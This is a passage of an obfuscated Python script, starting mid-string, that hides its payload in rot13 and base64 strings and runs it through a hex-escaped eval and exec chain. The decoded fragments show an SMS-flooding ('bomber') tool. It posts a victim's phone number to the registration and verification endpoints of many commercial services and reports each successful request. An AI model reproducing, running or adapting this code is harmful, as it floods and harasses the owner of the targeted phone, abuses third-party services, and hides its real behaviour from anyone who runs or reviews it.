9yZCI6IHBhc3N3b3JkLCAiYXBwbGljYXRpb24iOiAibGtwIiwgImxvZ2luIjogIisiICsgX3Bob25lfSkKCQlwcmludCgnWytdIEludml0cm8gUmVxdWVzdHMgU3VjY2Vzc2Z1bCEnKQoJZXhjZ'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))